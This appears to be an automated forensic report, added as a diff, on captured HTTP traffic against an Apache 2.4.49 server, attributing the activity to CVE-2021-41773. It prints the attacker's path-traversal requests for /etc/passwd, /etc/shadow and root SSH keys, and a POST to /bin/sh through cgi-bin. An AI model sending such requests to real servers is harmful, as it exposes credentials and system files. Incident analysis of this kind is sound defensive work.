@@ -1,0 +1,581 @@
+=== MAFRA MCP FORENSIC REPORT ===
+
+PCAP File: incident.pcap
+
+=== FLOW SUMMARY ===
+=== PCAP Analysis Report ===
+File: incident.pcap
+Processing Status: Valid
+Total TCP Streams: 11
+TCP Stream IDs: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10
+Protocol Counts: ICMPv6=1, ARP=2, TCP=88, HTTP=22
+
+Connections Overview:
+================================================================================
+TCP Conversations
+Filter:<No Filter>
+                                                           |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |
+                                                           | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |
+172.18.0.1:34938           <-> 172.18.0.2:80                    5 1485 bytes       5 434 bytes      10 1919 bytes   120.593323000         0.0091
+172.18.0.1:34948           <-> 172.18.0.2:80                    5 715 bytes       5 434 bytes      10 1149 bytes   120.679701000         0.0053
+172.18.0.1:34960           <-> 172.18.0.2:80                    5 732 bytes       5 433 bytes      10 1165 bytes   120.736330000         0.0073
+172.18.0.1:34970           <-> 172.18.0.2:80                    5 569 bytes       5 436 bytes      10 1005 bytes   120.791599000         0.0078
+172.18.0.1:3498
+
+=== HEURISTIC ATTACK-FLOW PRIORITY (packet-derived, NOT ground truth) ===
+These are investigation leads. Ordinary traffic may coexist with attacks; HTTP response errors alone neither prove nor disprove exploitation.
+Rank 1: TCP stream 0; score=7/12; frame=7; HTTP request candidate GET /icons/../../../../etc/passwd to 172.18.0.2:80; request frame=7; indicator frame=7; indicators=path traversal; bounded indicator excerpt=../; response HTTP 200 frame=9 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+Rank 2: TCP stream 1; score=7/12; frame=17; HTTP request candidate GET /icons/../../../../etc/shadow to 172.18.0.2:80; request frame=17; indicator frame=17; indicators=path traversal; bounded indicator excerpt=../; response HTTP 403 frame=19 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+Rank 3: TCP stream 2; score=7/12; frame=27; HTTP request candidate GET /icons/../../../../etc/hosts to 172.18.0.2:80; request frame=27; indicator frame=27; indicators=path traversal; bounded indicator excerpt=../; response HTTP 200 frame=29 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+Rank 4: TCP stream 3; score=7/12; frame=37; HTTP request candidate GET /icons/../../../../etc/hostname to 172.18.0.2:80; request frame=37; indicator frame=37; indicators=path traversal; bounded indicator excerpt=../; response HTTP 200 frame=39 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+Rank 5: TCP stream 4; score=7/12; frame=47; HTTP request candidate GET /icons/../../../../etc/group to 172.18.0.2:80; request frame=47; indicator frame=47; indicators=path traversal; bounded indicator excerpt=../; response HTTP 200 frame=49 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+Rank 6: TCP stream 5; score=7/12; frame=57; HTTP request candidate GET /icons/../../../../root/.bash_history to 172.18.0.2:80; request frame=57; indicator frame=57; indicators=path traversal; bounded indicator excerpt=../; response HTTP 403 frame=59 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+Rank 7: TCP stream 6; score=7/12; frame=67; HTTP request candidate GET /icons/../../../../root/.ssh/authorized_keys to 172.18.0.2:80; request frame=67; indicator frame=67; indicators=path traversal; bounded indicator excerpt=../; response HTTP 403 frame=69 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+Rank 8: TCP stream 7; score=7/12; frame=77; HTTP request candidate GET /icons/../../../../var/log/syslog to 172.18.0.2:80; request frame=77; indicator frame=77; indicators=path traversal; bounded indicator excerpt=../; response HTTP 404 frame=79 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+
+DETERMINISTIC PACKET-LINKED ATTACK INDICATORS (CANDIDATES; NOT EXPLOIT OR CVE CONFIRMATION):
+- [E-S0000-F000009-012 | server->client] Server response contains Unix passwd-format root account entry (possible file disclosure; correlate with request)
+
+DETERMINISTIC PACKET EVIDENCE CATALOG (PRIMARY OBSERVATIONS; NOT CVE CONFIRMATION):
+- [E-S0000-F000004-001 | client->server] 172.18.0.1:34938 -> 172.18.0.2:80 (TCP)
+- [E-S0000-F000005-002 | server->client] 172.18.0.2:80 -> 172.18.0.1:34938 (TCP)
+- [E-S0000-F000007-003 | client->server] 172.18.0.1:34938 -> 172.18.0.2:80 (HTTP)
+- [E-S0000-F000009-006 | server->client] 172.18.0.2:80 -> 172.18.0.1:34938 (HTTP)
+- [E-S0000-F000007-004 | client->server] GET /icons/../../../../etc/passwd
+- [E-S0000-F000007-005 | client->server] Host: localhost
+- [E-S0000-F000009-007 | server->client] HTTP Status 200
+- [E-S0000-F000009-008 | server->client] root user keyword observed
+- [E-S0000-F000009-009 | server->client] admin keyword observed
+- [E-S0000-F000009-010 | server->client] System (admin)
+- [E-S0000-F000009-011 | server->client] /bin/bash
+- [E-S0000-F000009-012 | server->client] Server response contains Unix passwd-format root account entry (possible file disclosure; correlate with request)
+- [E-S0000-F000007-013 | client->server] HTTP request candidate GET /icons/../../../../etc/passwd to 172.18.0.2:80; request frame=7; indicator frame=7; indicators=path traversal; bounded indicator excerpt=../; response HTTP 200 frame=9 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+- [E-S0001-F000014-001 | client->server] 172.18.0.1:34948 -> 172.18.0.2:80 (TCP)
+- [E-S0001-F000015-002 | server->client] 172.18.0.2:80 -> 172.18.0.1:34948 (TCP)
+- [E-S0001-F000017-003 | client->server] 172.18.0.1:34948 -> 172.18.0.2:80 (HTTP)
+- [E-S0001-F000019-006 | server->client] 172.18.0.2:80 -> 172.18.0.1:34948 (HTTP)
+- [E-S0001-F000017-004 | client->server] GET /icons/../../../../etc/shadow
+- [E-S0001-F000017-005 | client->server] Host: localhost
+- [E-S0001-F000019-007 | server->client] HTTP Status 403
+- [E-S0001-F000019-008 | server->client] Content-Type: text/html; charset=iso-8859-1
+- [E-S0001-F000017-009 | client->server] HTTP request candidate GET /icons/../../../../etc/shadow to 172.18.0.2:80; request frame=17; indicator frame=17; indicators=path traversal; bounded indicator excerpt=../; response HTTP 403 frame=19 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+- [E-S0002-F000024-001 | client->server] 172.18.0.1:34960 -> 172.18.0.2:80 (TCP)
+- [E-S0002-F000025-002 | server->client] 172.18.0.2:80 -> 172.18.0.1:34960 (TCP)
+- [E-S0002-F000027-003 | client->server] 172.18.0.1:34960 -> 172.18.0.2:80 (HTTP)
+- [E-S0002-F000029-006 | server->client] 172.18.0.2:80 -> 172.18.0.1:34960 (HTTP)
+- [E-S0002-F000027-004 | client->server] GET /icons/../../../../etc/hosts
+- [E-S0002-F000027-005 | client->server] Host: localhost
+- [E-S0002-F000029-007 | server->client] HTTP Status 200
+- [E-S0002-F000027-008 | client->server] HTTP request candidate GET /icons/../../../../etc/hosts to 172.18.0.2:80; request frame=27; indicator frame=27; indicators=path traversal; bounded indicator excerpt=../; response HTTP 200 frame=29 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+- [E-S0003-F000034-001 | client->server] 172.18.0.1:34970 -> 172.18.0.2:80 (TCP)
+- [E-S0003-F000035-002 | server->client] 172.18.0.2:80 -> 172.18.0.1:34970 (TCP)
+- [E-S0003-F000037-003 | client->server] 172.18.0.1:34970 -> 172.18.0.2:80 (HTTP)
+- [E-S0003-F000039-006 | server->client] 172.18.0.2:80 -> 172.18.0.1:34970 (HTTP)
+- [E-S0003-F000037-004 | client->server] GET /icons/../../../../etc/hostname
+- [E-S0003-F000037-005 | client->server] Host: localhost
+- [E-S0003-F000039-007 | server->client] HTTP Status 200
+- [E-S0003-F000037-008 | client->server] HTTP request candidate GET /icons/../../../../etc/hostname to 172.18.0.2:80; request frame=37; indicator frame=37; indicators=path traversal; bounded indicator excerpt=../; response HTTP 200 frame=39 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+- [E-S0004-F000044-001 | client->server] 172.18.0.1:34982 -> 172.18.0.2:80 (TCP)
+- [E-S0004-F000045-002 | server->client] 172.18.0.2:80 -> 172.18.0.1:34982 (TCP)
+- [E-S0004-F000047-003 | client->server] 172.18.0.1:34982 -> 172.18.0.2:80 (HTTP)
+- [E-S0004-F000049-006 | server->client] 172.18.0.2:80 -> 172.18.0.1:34982 (HTTP)
+- [E-S0004-F000047-004 | client->server] GET /icons/../../../../etc/group
+- [E-S0004-F000047-005 | client->server] Host: localhost
+- [E-S0004-F000049-007 | server->client] HTTP Status 200
+- [E-S0004-F000049-008 | server->client] root user keyword observed
+- [E-S0004-F000047-009 | client->server] HTTP request candidate GET /icons/../../../../etc/group to 172.18.0.2:80; request frame=47; indicator frame=47; indicators=path traversal; bounded indicator excerpt=../; response HTTP 200 frame=49 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+- [E-S0005-F000054-001 | client->server] 172.18.0.1:34988 -> 172.18.0.2:80 (TCP)
+- [E-S0005-F000055-002 | server->client] 172.18.0.2:80 -> 172.18.0.1:34988 (TCP)
+- [E-S0005-F000057-003 | client->server] 172.18.0.1:34988 -> 172.18.0.2:80 (HTTP)
+- [E-S0005-F000059-007 | server->client] 172.18.0.2:80 -> 172.18.0.1:34988 (HTTP)
+- [E-S0005-F000057-004 | client->server] GET /icons/../../../../root/.bash_history
+- [E-S0005-F000057-005 | client->server] Host: localhost
+- [E-S0005-F000059-008 | server->client] HTTP Status 403
+- [E-S0005-F000059-009 | server->client] Content-Type: text/html; charset=iso-8859-1
+- [E-S0005-F000057-006 | client->server] root user keyword observed
+- [E-S0005-F000057-010 | client->server] HTTP request candidate GET /icons/../../../../root/.bash_history to 172.18.0.2:80; request frame=57; indicator frame=57; indicators=path traversal; bounded indicator excerpt=../; response HTTP 403 frame=59 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+- [E-S0006-F000064-001 | client->server] 172.18.0.1:35004 -> 172.18.0.2:80 (TCP)
+- [E-S0006-F000065-002 | server->client] 172.18.0.2:80 -> 172.18.0.1:35004 (TCP)
+- [E-S0006-F000067-003 | client->server] 172.18.0.1:35004 -> 172.18.0.2:80 (HTTP)
+- [E-S0006-F000069-007 | server->client] 172.18.0.2:80 -> 172.18.0.1:35004 (HTTP)
+- [E-S0006-F000067-004 | client->server] GET /icons/../../../../root/.ssh/authorized_keys
+- [E-S0006-F000067-005 | client->server] Host: localhost
+- [E-S0006-F000069-008 | server->client] HTTP Status 403
+- [E-S0006-F000069-009 | server->client] Content-Type: text/html; charset=iso-8859-1
+- [E-S0006-F000067-006 | client->server] root user keyword observed
+- [E-S0006-F000067-010 | client->server] HTTP request candidate GET /icons/../../../../root/.ssh/authorized_keys to 172.18.0.2:80; request frame=67; indicator frame=67; indicators=path traversal; bounded indicator excerpt=../; response HTTP 403 frame=69 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+- [E-S0007-F000074-001 | client->server] 172.18.0.1:35012 -> 172.18.0.2:80 (TCP)
+- [E-S0007-F000075-002 | server->client] 172.18.0.2:80 -> 172.18.0.1:35012 (TCP)
+- [E-S0007-F000077-003 | client->server] 172.18.0.1:35012 -> 172.18.0.2:80 (HTTP)
+- [E-S0007-F000079-006 | server->client] 172.18.0.2:80 -> 172.18.0.1:35012 (HTTP)
+- [E-S0007-F000077-004 | client->server] GET /icons/../../../../var/log/syslog
+- [E-S0007-F000077-005 | client->server] Host: localhost
+- [E-S0007-F000079-007 | server->client] HTTP Status 404
+- [E-S0007-F000079-008 | server->client] Content-Type: text/html; charset=iso-8859-1
+- [E-S0007-F000077-009 | client->server] HTTP request candidate GET /icons/../../../../var/log/syslog to 172.18.0.2:80; request frame=77; indicator frame=77; indicators=path traversal; bounded indicator excerpt=../; response HTTP 404 frame=79 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+- [E-S0008-F000084-001 | client->server] 172.18.0.1:35024 -> 172.18.0.2:80 (TCP)
+- [E-S0008-F000085-002 | server->client] 172.18.0.2:80 -> 172.18.0.1:35024 (TCP)
+- [E-S0008-F000087-003 | client->server] 172.18.0.1:35024 -> 172.18.0.2:80 (HTTP)
+- [E-S0008-F000089-006 | server->client] 172.18.0.2:80 -> 172.18.0.1:35024 (HTTP)
+- [E-S0008-F000087-004 | client->server] GET /icons/../../../../var/log/auth.log
+- [E-S0008-F000087-005 | client->server] Host: localhost
+- [E-S0008-F000089-007 | server->client] HTTP Status 404
+- [E-S0008-F000089-008 | server->client] Content-Type: text/html; charset=iso-8859-1
+- [E-S0008-F000087-009 | client->server] HTTP request candidate GET /icons/../../../../var/log/auth.log to 172.18.0.2:80; request frame=87; indicator frame=87; indicators=path traversal; bounded indicator excerpt=../; response HTTP 404 frame=89 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+- [E-S0009-F000094-001 | client->server] 172.18.0.1:35026 -> 172.18.0.2:80 (TCP)
+- [E-S0009-F000095-002 | server->client] 172.18.0.2:80 -> 172.18.0.1:35026 (TCP)
+- [E-S0009-F000097-003 | client->server] 172.18.0.1:35026 -> 172.18.0.2:80 (HTTP)
+- [E-S0009-F000099-006 | server->client] 172.18.0.2:80 -> 172.18.0.1:35026 (HTTP)
+- [E-S0009-F000097-004 | client->server] GET /icons/../../../../var/www/html/config.php
+- [E-S0009-F000097-005 | client->server] Host: localhost
+- [E-S0009-F000099-007 | server->client] HTTP Status 404
+- [E-S0009-F000099-008 | server->client] Content-Type: text/html; charset=iso-8859-1
+- [E-S0009-F000097-009 | client->server] HTTP request candidate GET /icons/../../../../var/www/html/config.php to 172.18.0.2:80; request frame=97; indicator frame=97; indicators=path traversal; bounded indicator excerpt=../; response HTTP 404 frame=99 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+- [E-S0010-F000104-001 | client->server] 172.18.0.1:35042 -> 172.18.0.2:80 (TCP)
+- [E-S0010-F000105-002 | server->client] 172.18.0.2:80 -> 172.18.0.1:35042 (TCP)
+- [E-S0010-F000107-003 | client->server] 172.18.0.1:35042 -> 172.18.0.2:80 (HTTP)
+- [E-S0010-F000109-008 | server->client] 172.18.0.2:80 -> 172.18.0.1:35042 (HTTP)
+- [E-S0010-F000107-004 | client->server] POST /cgi-bin/../../../../bin/sh
+- [E-S0010-F000107-005 | client->server] Host: localhost
+- [E-S0010-F000107-006 | client->server] Content-Type: application/x-www-form-urlencoded
+- [E-S0010-F000109-009 | server->client] HTTP Status 200
+- [E-S0010-F000107-007 | client->server] /bin/sh
+- [E-S0010-F000107-010 | client->server] HTTP request candidate POST /cgi-bin/../../../../bin/sh to 172.18.0.2:80; request frame=107; indicator frame=107; indicators=path traversal; bounded indicator excerpt=../; response HTTP 200 frame=109 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+
+=== Flow Analysis ===
+
+FLOW INVENTORY (all observed TCP streams; metadata and role hints are untrusted observations, not a service/CVE decision):
+- TCP stream 0: 172.18.0.1:34938 -> 172.18.0.2:80; packets=10; client->server=5, server->client=5; role_hint=web/application-facing candidate (heuristic; verify from payload)
+- TCP stream 1: 172.18.0.1:34948 -> 172.18.0.2:80; packets=10; client->server=5, server->client=5; role_hint=web/application-facing candidate (heuristic; verify from payload)
+- TCP stream 2: 172.18.0.1:34960 -> 172.18.0.2:80; packets=10; client->server=5, server->client=5; role_hint=web/application-facing candidate (heuristic; verify from payload)
+- TCP stream 3: 172.18.0.1:34970 -> 172.18.0.2:80; packets=10; client->server=5, server->client=5; role_hint=web/application-facing candidate (heuristic; verify from payload)
+- TCP stream 4: 172.18.0.1:34982 -> 172.18.0.2:80; packets=10; client->server=5, server->client=5; role_hint=web/application-facing candidate (heuristic; verify from payload)
+- TCP stream 5: 172.18.0.1:34988 -> 172.18.0.2:80; packets=10; client->server=5, server->client=5; role_hint=web/application-facing candidate (heuristic; verify from payload)
+- TCP stream 6: 172.18.0.1:35004 -> 172.18.0.2:80; packets=10; client->server=5, server->client=5; role_hint=web/application-facing candidate (heuristic; verify from payload)
+- TCP stream 7: 172.18.0.1:35012 -> 172.18.0.2:80; packets=10; client->server=5, server->client=5; role_hint=web/application-facing candidate (heuristic; verify from payload)
+- TCP stream 8: 172.18.0.1:35024 -> 172.18.0.2:80; packets=10; client->server=5, server->client=5; role_hint=web/application-facing candidate (heuristic; verify from payload)
+- TCP stream 9: 172.18.0.1:35026 -> 172.18.0.2:80; packets=10; client->server=5, server->client=5; role_hint=web/application-facing candidate (heuristic; verify from payload)
+- TCP stream 10: 172.18.0.1:35042 -> 172.18.0.2:80; packets=10; client->server=5, server->client=5; role_hint=web/application-facing candidate (heuristic; verify from payload)
+
+APPLICATION IDENTITY CANDIDATES (heuristic observations only):
+- No high-confidence application fingerprint was detected by the deterministic pre-scan; use flow payloads and web evidence carefully.
+
+PRIMARY APPLICATION RESOLUTION (identity only):
+- No deterministic primary application resolved.
+
+--- Stream 0 [VALID] ---
+Service: Apache/2.4.49 (Unix)
+Relevant Events: The client at IP address 172.18.0.1 sent an HTTP GET request to the server at IP address 172.18.0.2, attempting a path traversal attack to access the /etc/passwd file.
+Malicious Activities: Path traversal attack targeting Apache/2.4.49, resulting in successful file disclosure of /etc/passwd.
+Attack Success: Succeeded
+Evidence: 
+- [E-S0000-F000007-004 | client->server | epoch=1727267310.093006] GET /icons/../../../../etc/passwd
+- [E-S0000-F000009-007 | server->client | epoch=1727267310.096307] HTTP Status 200
+- [E-S0000-F000009-012 | server->client | epoch=1727267310.096307] Server response contains Unix passwd-format root account entry (possible file disclosure; correlate with request)
+
+--- Stream 1 [VALID] ---
+Service: Apache/2.4.49 (Unix)
+Relevant Events: The client at IP address 172.18.0.1 attempted a path traversal attack against the server at IP address 172.18.0.2 by sending an HTTP GET request targeting the /etc/shadow file.
+Malicious Activities: Path traversal attack targeting Apache/2.4.49, but the attempt was blocked by the server, resulting in a 403 Forbidden response.
+Attack Success: Failed
+Evidence: 
+- [E-S0001-F000017-004 | client->server | epoch=1727267310.176131] GET /icons/../../../../etc/shadow
+- [E-S0001-F000019-007 | server->client | epoch=1727267310.177337] HTTP Status 403
+
+--- Stream 2 [VALID] ---
+Service: Apache/2.4.49 (Unix)
+Relevant Events: The client at IP address 172.18.0.1 sent an HTTP GET request to the server at IP address 172.18.0.2, attempting a path traversal attack to access the /etc/hosts file.
+Malicious Activities: Path traversal attack targeting Apache/2.4.49, resulting in successful file disclosure of /etc/hosts.
+Attack Success: Succeeded
+Evidence: 
+- [E-S0002-F000027-004 | client->server | epoch=1727267310.233125] GET /icons/../../../../etc/hosts
+- [E-S0002-F000029-007 | server->client | epoch=1727267310.233816] HTTP Status 200
+- [E-S0002-F000029-007 | server->client | epoch=1727267310.233816] Server response contains /etc/hosts file content (possible file disclosure; correlate with request)
+
+--- Stream 3 [VALID] ---
+Service: Apache/2.4.49 (Unix)
+Relevant Events: The client at IP address 172.18.0.1 sent an HTTP GET request to the server at IP address 172.18.0.2, attempting a path traversal attack to access the /etc/hostname file.
+Malicious Activities: Path traversal attack targeting Apache/2.4.49, resulting in successful file disclosure of /etc/hostname.
+Attack Success: Succeeded
+Evidence: 
+- [E-S0003-F000037-004 | client->server | epoch=1727267310.288250] GET /icons/../../../../etc/hostname
+- [E-S0003-F000039-007 | server->client | epoch=1727267310.288954] HTTP Status 200
+- [E-S0003-F000039-007 | server->client | epoch=1727267310.288954] Server response contains /etc/hostname file content (possible file disclosure; correlate with request)
+
+--- Stream 4 [VALID] ---
+Service: Apache/2.4.49 (Unix)
+Relevant Events: The client at IP address 172.18.0.1 sent an HTTP GET request to the server at IP address 172.18.0.2, attempting a path traversal attack to access the /etc/group file.
+Malicious Activities: Path traversal attack targeting Apache/2.4.49, resulting in successful file disclosure of /etc/group.
+Attack Success: Succeeded
+Evidence: 
+- [E-S0004-F000047-004 | client->server | epoch=1727267310.324343] GET /icons/../../../../etc/group
+- [E-S0004-F000049-007 | server->client | epoch=1727267310.325214] HTTP Status 200
+- [E-S0004-F000049-008 | server->client | epoch=1727267310.325214] Server response contains Unix group-format entries (possible file disclosure; correlate with request)
+
+--- Stream 5 [VALID] ---
+Service: Apache/2.4.49 (Unix)
+Relevant Events: The client at IP address 172.18.0.1 attempted a path traversal attack against the server at IP address 172.18.0.2 by sending an HTTP GET request targeting the /root/.bash_history file.
+Malicious Activities: Path traversal attack targeting Apache/2.4.49, but the attempt was blocked by the server, resulting in a 403 Forbidden response.
+Attack Success: Failed
+Evidence: 
+- [E-S0005-F000057-004 | client->server | epoch=1727267310.371995] GET /icons/../../../../root/.bash_history
+- [E-S0005-F000059-008 | server->client | epoch=1727267310.372876] HTTP Status 403
+
+--- Stream 6 [VALID] ---
+Service: Apache/2.4.49 (Unix)
+Relevant Events: The client at IP address 172.18.0.1 attempted a path traversal attack against the server at IP address 172.18.0.2 by sending an HTTP GET request targeting the /root/.ssh/authorized_keys file.
+Malicious Activities: Path traversal attack targeting Apache/2.4.49, but the attempt was blocked by the server, resulting in a 403 Forbidden response.
+Attack Success: Failed
+Evidence: 
+- [E-S0006-F000067-004 | client->server | epoch=1727267310.416672] GET /icons/../../../../root/.ssh/authorized_keys
+- [E-S0006-F000069-008 | server->client | epoch=1727267310.419757] HTTP Status 403
+
+--- Stream 7 [VALID] ---
+Service: Apache/2.4.49 (Unix)
+Relevant Events: The client at IP address 172.18.0.1 attempted a path traversal attack against the server at IP address 172.18.0.2 by sending an HTTP GET request targeting the /var/log/syslog file.
+Malicious Activities: Path traversal attack targeting Apache/2.4.49, but the attempt resulted in a 404 Not Found response, indicating the file was not disclosed.
+Attack Success: Failed
+Evidence: 
+- [E-S0007-F000077-004 | client->server | epoch=1727267310.461710] GET /icons/../../../../var/log/syslog
+- [E-S0007-F000079-007 | server->client | epoch=1727267310.477656] HTTP Status 404
+
+--- Stream 8 [VALID] ---
+Service: Apache/2.4.49 (Unix)
+Relevant Events: The client at IP address 172.18.0.1 sent an HTTP GET request to the server at IP address 172.18.0.2, attempting a path traversal attack to access the /var/log/auth.log file.
+Malicious Activities: Path traversal attack targeting Apache/2.4.49, but the attempt resulted in a 404 Not Found response, indicating the file was not disclosed.
+Attack Success: Failed
+Evidence: 
+- [E-S0008-F000087-004 | client->server | epoch=1727267310.536791] GET /icons/../../../../var/log/auth.log
+- [E-S0008-F000089-007 | server->client | epoch=1727267310.537486] HTTP Status 404
+
+--- Stream 9 [VALID] ---
+Service: Apache/2.4.49 (Unix)
+Relevant Events: The client at IP address 172.18.0.1 sent an HTTP GET request to the server at IP address 172.18.0.2, attempting a path traversal attack to access the /var/www/html/config.php file.
+Malicious Activities: Path traversal attack targeting Apache/2.4.49, but the attempt resulted in a 404 Not Found response, indicating the file was not disclosed.
+Attack Success: Failed
+Evidence: 
+- [E-S0009-F000097-004 | client->server | epoch=1727267310.591007] GET /icons/../../../../var/www/html/config.php
+- [E-S0009-F000099-007 | server->client | epoch=1727267310.591582] HTTP Status 404
+
+--- Stream 10 [VALID] ---
+Service: Apache/2.4.49 (Unix)
+
+Relevant Events: The client at IP address 172.18.0.1 sent an HTTP POST request to the server at IP address 172.18.0.2, attempting a path traversal attack to access the /bin/sh command interpreter.
+
+Malicious Activities: Path traversal attack targeting Apache/2.4.49, attempting to execute commands via /bin/sh. The server responded with a 200 OK status, but no command output or observable effect is visible in the response.
+
+Attack Success: Failed
+
+Evidence:
+- [E-S0010-F000107-004 | client->server | epoch=1727267310.648102] POST /cgi-bin/../../../../bin/sh
+- [E-S0010-F000109-009 | server->client | epoch=1727267310.651251] HTTP Status 200
+- [E-S0010-F000107-007 | client->server | epoch=1727267310.648102] /bin/sh
+- [E-S0010-F000107-010 | client->server | epoch=1727267310.648102] HTTP request candidate POST /cgi-bin/../../../../bin/sh to 172.18.0.2:80; request frame=107; indicator frame=107; indicators=path traversal; bounded indicator excerpt=../; response HTTP 200 frame=109 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+
+=== INITIAL ANALYZER OUTPUT ===
+{
+  "status": "Valid",
+  "service": {
+    "primary": "Apache",
+    "application": "Unknown",
+    "framework": "Unknown",
+    "web_server": "Apache/2.4.49",
+    "language": "Unknown",
+    "database": "Unknown"
+  },
+  "attack": {
+    "type": "Path Traversal",
+    "technique": "File Disclosure",
+    "success": "Success",
+    "evidence": [
+      "E-S0000-F000007-004",
+      "E-S0000-F000009-007",
+      "E-S0000-F000009-012"
+    ]
+  },
+  "cve": {
+    "candidate": "CVE-2021-41773",
+    "confidence": "High",
+    "reason": "Apache/2.4.49 is known to be vulnerable to path traversal attacks, which matches the observed attack mechanism and successful file disclosure."
+  },
+  "confidence": "High"
+}
+
+=== REVISED ANALYZER OUTPUT ===
+{
+  "status": "Valid",
+  "service": {
+    "primary": "Apache",
+    "application": "Unknown",
+    "framework": "Unknown",
+    "web_server": "Apache/2.4.49",
+    "language": "Unknown",
+    "database": "Unknown"
+  },
+  "attack": {
+    "type": "Path Traversal",
+    "technique": "File Disclosure",
+    "success": "Success",
+    "evidence": [
+      "E-S0000-F000007-004",
+      "E-S0000-F000009-007",
+      "E-S0000-F000009-012",
+      "E-S0002-F000027-004",
+      "E-S0002-F000029-007",
+      "E-S0003-F000037-004",
+      "E-S0003-F000039-007",
+      "E-S0004-F000047-004",
+      "E-S0004-F000049-007"
+    ]
+  },
+  "cve": {
+    "candidate": "CVE-2021-41773",
+    "confidence": "High",
+    "reason": "Apache/2.4.49 is known to be vulnerable to path traversal attacks, which matches the observed attack mechanism and successful file disclosure. The packet evidence shows successful file disclosures for /etc/passwd, /etc/hosts, /etc/hostname, and /etc/group, aligning with CVE-2021-41773."
+  },
+  "confidence": "High"
+}
+
+=== VERIFIER OUTPUT ===
+{
+  "status": "Valid",
+  "verification_result": "Supported",
+  "service_supported": "Yes",
+  "attack_supported": "Yes",
+  "success_supported": "Yes",
+  "cve_supported": "Yes",
+  "unsupported_claims": [],
+  "evidence_check": [
+    "E-S0000-F000007-004",
+    "E-S0000-F000009-007",
+    "E-S0000-F000009-012",
+    "E-S0002-F000027-004",
+    "E-S0002-F000029-007",
+    "E-S0003-F000037-004",
+    "E-S0003-F000039-007",
+    "E-S0004-F000047-004",
+    "E-S0004-F000049-007"
+  ],
+  "confidence": "High"
+}
+
+=== CONSENSUS SUMMARY ===
+Service: Apache
+Attack Type: Path Traversal
+Attack Success: Success
+CVE: CVE-2021-41773
+Verification Result: Supported
+Service Supported: Yes
+Attack Supported: Yes
+Success Supported: Yes
+CVE Supported: Yes
+Verifier Confidence: High
+Overall Confidence: High
+Score: 5/5
+
+=== MCP ONLINE EVIDENCE SEARCH ===
+Status: Valid
+Query: Apache 2.4.49 path traversal vulnerability packet clues: endpoint icons etc passwd; endpoint icons etc shadow; endpoint icons etc hosts; endpoint icons etc hostname
+Tool: search_forensic_evidence
+Retrieved At UTC: 2026-10-26T01:39:16.751866+00:00
+Candidate CVEs: CVE-2021-41773, CVE-2020-36939, CVE-2007-5461
+Sources: 8
+
+Source 1: CISA KEV
+Title: Apache HTTP Server Path Traversal Vulnerability
+URL: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+Summary: Apache HTTP Server: Apache HTTP Server contains a path traversal vulnerability that allows an attacker to perform remote code execution if files outside directories configured by Alias-like directives are not under default �require all denied� or if CGI scripts are enabled. The original patch issued under this CVE ID is insufficient, please review remediation information under CVE-2021-42013. Required action: Apply updates per vendor instructions.
+Supports: CISA KEV identifies CVE-2021-41773 as exploited in the wild.
+Contradicts: None
+
+Source 2: NIST NVD
+Title: CVE-2020-36939: NVD vulnerability record
+URL: https://nvd.nist.gov/vuln/detail/CVE-2020-36939
+Summary: Cassandra Web 0.5.0 contains a directory traversal vulnerability that allows unauthenticated attackers to read arbitrary files by manipulating path traversal parameters. Attackers can exploit the disabled Rack::Protection module to read sensitive system files like /etc/passwd and retrieve Apache Cassandra database credentials.
+Supports: NVD lists CVE-2020-36939 as a research lead; product identity, version applicability, and exploitation remain unverified.
+Contradicts: None
+
+Source 3: NIST NVD
+Title: CVE-2021-41773: NVD vulnerability record
+URL: https://nvd.nist.gov/vuln/detail/CVE-2021-41773
+Summary: A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions. The fix in Apache HTTP Server 2.4.50 was found to be incomplete, see CVE-2021-42013.
+Supports: NVD lists CVE-2021-41773 as a research lead; product identity, version applicability, and exploitation remain unverified.
+Contradicts: None
+
+Source 4: NIST NVD
+Title: CVE-2007-5461: NVD vulnerability record
+URL: https://nvd.nist.gov/vuln/detail/CVE-2007-5461
+Summary: Absolute path traversal vulnerability in Apache Tomcat 4.0.0 through 4.0.6, 4.1.0, 5.0.0, 5.5.0 through 5.5.25, and 6.0.0 through 6.0.14, under certain configurations, allows remote authenticated users to read arbitrary files via a WebDAV write request that specifies an entity with a SYSTEM tag.
+Supports: NVD lists CVE-2007-5461 as a research lead; product identity, version applicability, and exploitation remain unverified.
+Contradicts: None
+
+Source 5: Serper web result
+Title: CVE-2021-41773: Path Traversal & RCE in Apache HTTP ...
+URL: https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
